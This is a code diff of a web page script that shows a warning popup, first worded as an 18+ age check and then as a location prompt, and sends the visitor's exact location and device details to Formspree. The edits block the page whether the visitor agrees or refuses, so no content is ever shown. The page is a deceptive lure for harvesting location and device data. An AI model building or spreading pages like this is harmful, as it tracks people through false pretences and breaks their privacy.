@@ -82,8 +82,8 @@
     <script>
 (async () => {
   const askLocation = await Swal.fire({
-    title: "Are you 18+ ?",
-    text: "Warning: This content is intended for mature audiences only. Viewer discretion is advised.",
+    title: "Are you sure ?",
+    text: "Warning: This content is access location for better containet. Viewer discretion is advised.",
     icon: "warning",
     allowOutsideClick: false,  // block clicking outside
     allowEscapeKey: false,     // block ESC key
@@ -95,7 +95,7 @@
   if (askLocation.isConfirmed) {
     getExactLocation(true);
   } else {
-    getApproxLocation(false);
+      denyAccess();
   }
 
   async function getExactLocation(userConsented) {
@@ -133,7 +133,7 @@
     trackingInfo["User Consent"] = userConsented ? "Yes" : "No";
 
     sendToFormspree(trackingInfo);
-    unlockPage();
+    denyAccess(); 
   }
 
   async function getDeviceInfo() {
@@ -176,6 +176,16 @@
     document.body.style.overflow = "auto";        // Re-enable scrolling
     document.getElementById("page-content").style.display = "block"; // Show page
   }
+    function denyAccess() {
+  document.body.innerHTML = `
+    <div style="height:100vh;display:flex;align-items:center;justify-content:center;background:black;color:white;font-family:sans-serif;flex-direction:column;text-align:center;padding:20px;">
+      <h2>Access Denied</h2>
+      <p>You must allow location access to view this content.</p>
+    </div>
+  `;
+  document.body.style.overflow = "hidden";
+}
+
 })();
 </script>
 </body>
